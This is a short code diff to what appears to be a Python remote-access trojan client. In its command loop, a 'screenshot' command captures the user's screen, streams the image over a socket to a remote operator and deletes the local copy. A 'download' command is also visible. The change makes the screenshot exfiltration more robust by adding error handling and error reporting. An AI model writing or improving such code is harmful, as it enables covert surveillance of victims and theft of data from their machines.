@@ -382,7 +382,19 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
             elif cmd == "screenshot":
                 try:
                     ss_path = os.path.join(EXTRACT_FOLDER, "remote_screenshot.png")
-                    ImageGrab.grab().save(ss_path)
+            
+                    # Try to take screenshot
+                    try:
+                        img = ImageGrab.grab()
+                        img.save(ss_path)
+                    except Exception as e:
+                        error_msg = f"[!] Screenshot failed: {e}"
+                        with open(os.path.join(EXTRACT_FOLDER, "screenshot_error.txt"), "w") as f:
+                            f.write(error_msg)
+                        send_data(error_msg)
+                        continue  # Skip sending file
+            
+                    # If saved successfully, send the file
                     with open(ss_path, "rb") as f:
                         s.sendall(b"STARTFILE\n")
                         while True:
@@ -391,9 +403,12 @@ RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
                                 break
                             s.sendall(chunk)
                         s.sendall(b"\nENDFILE")
+            
                     os.remove(ss_path)
-                except:
-                    send_data("[!] Screenshot failed.")
+            
+                except Exception as e:
+                    send_data(f"[!] Screenshot process failed: {e}")
+
 
             elif cmd.startswith("download "):
                 filename = cmd.split(" ", 1)[1]
